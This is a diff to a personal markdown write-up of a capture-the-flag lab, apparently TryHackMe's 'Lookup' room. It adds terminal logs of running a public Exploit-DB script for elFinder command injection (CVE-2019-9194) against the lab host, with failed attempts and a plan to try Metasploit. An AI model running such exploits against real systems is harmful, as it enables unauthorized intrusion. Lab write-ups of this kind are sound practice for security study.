@@ -304,9 +304,41 @@ Shellcodes: No Results
 ![](Obsidian%20assets/elFinder%20version.png)
 
 > [!note]
-> CMD injection was the way it seems like with CVE-2019-9194
+> CMD injection was the way it seems like with CVE-2019-9194.
 
+```
+┌──(kali㉿kali)-[~]
+└─$ python2 elFinder.py http://files.lookup.thm/elFinder/elfinder.html          
+[*] Uploading the malicious image...
+Traceback (most recent call last):
+  File "elFinder.py", line 107, in <module>
+    main()
+  File "elFinder.py", line 96, in main
+    hash = upload(url, payload)
+  File "elFinder.py", line 41, in upload
+    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
+IOError: [Errno 2] No such file or directory: 'SecSignal.jpg'
+                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ python3 elFinder.py http://files.lookup.thm/elFinder/elfinder.html
+  File "/home/kali/elFinder.py", line 34
+    print "Usage: python exploit.py [URL]"
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
+                                                                                                                                                            
 
+┌──(kali㉿kali)-[~]
+└─$ touch SecSignal.jpg                                  
+                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ python2 elFinder.py http://files.lookup.thm/elFinder/             
+[*] Uploading the malicious image...
+[*] Running the payload...
+[*] The site seems not to be vulnerable :(
+```
+
+> [!note]
+> Tried to use the exploit found on exploit DB https://www.exploit-db.com/exploits/46481 - no luck and rather try metasploit for now.
 
 
 
